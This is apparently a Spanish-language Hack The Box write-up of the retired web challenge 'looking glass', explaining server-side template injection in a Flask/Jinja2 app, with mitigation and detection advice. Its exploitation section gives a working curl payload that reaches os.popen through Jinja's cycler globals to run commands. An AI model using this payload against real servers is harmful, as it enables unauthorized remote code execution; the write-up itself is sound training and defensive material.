---
challenge: looking glass
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, flask, ssti, jinja2, rce]
---

# looking glass — Hack The Box (Challenge)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flag real.

## TL;DR

Una aplicación Flask refleja un parámetro en una plantilla Jinja2. La expresión `{{7*7}}` confirma la inyección de plantilla del lado del servidor y el encadenamiento de objetos de Jinja permite ejecutar comandos y leer la flag.

## Enunciado y superficie

- Web, Easy, retirado.
- Se entrega una URL con una página que simula un espejo.
- El parámetro de entrada se muestra en la respuesta.

```bash
curl -s -I http://<IP>:<PORT>/
curl -s 'http://<IP>:<PORT>/?=test'
```

## Reconocimiento

```bash
curl -s 'http://<IP>:<PORT>/?={{7*7}}'
```

- La respuesta devuelve `49`, no el texto literal.
- El servidor es Flask/Werkzeug.
- No hay autenticación ni formularios complejos.

## Análisis del código

La aplicación pasa la entrada a `render_template_string` o construye la plantilla con concatenación. Jinja2 evalúa las expresiones entre `{{ }}`; el contexto incluye objetos de Python accesibles desde `cycler`, `lipsum`, `joiner` o `config`.

## Explicación del fallo

La entrada del usuario se trata como código de plantilla en lugar de datos. No es un XSS: la evaluación ocurre en el servidor y puede alcanzar `os.popen` o `subprocess.Popen` a través de la cadena de clases de Python.

## Reproducción local

```bash
python3 -m flask --app app run
# Probar la expresión y el payload en local
```

## Explotación

```bash
curl -s 'http://<IP>:<PORT>/?={{7*7}}'
curl -s 'http://<IP>:<PORT>/?={{cycler.__init__.__globals__.os.popen("id").read()}}'
```

Se localiza la flag en el directorio de la aplicación o en la raíz y se redacta.

## Evidencia

- `{{7*7}}` devolviendo `49`.
- `id` ejecutado desde la plantilla.
- Lectura de la flag sin publicar el valor.

## Lecciones aprendidas

- Un motor de plantillas no debe recibir plantillas del usuario.
- `{{7*7}}` es una prueba rápida y poco invasiva.
- El contexto de Jinja puede ser suficiente para RCE.

## Mitigaciones y detección

- Pasar la entrada como variable y no como plantilla.
- Usar un sandbox de Jinja y deshabilitar objetos peligrosos.
- Alertar de expresiones `{{`, `{%` y de errores de plantilla en logs.
- Referencias: OWASP SSTI, PortSwigger, HTB looking glass.

## Referencias

- <https://www.hackthebox.com/challenges/looking%20glass>
- <https://7rocky.github.io/en/ctf/htb-challenges/web/looking-glass/>
- <https://owasp.org/www-community/attacks/Server-Side_Template_Injection>
- <https://attack.mitre.org/techniques/T1190/>
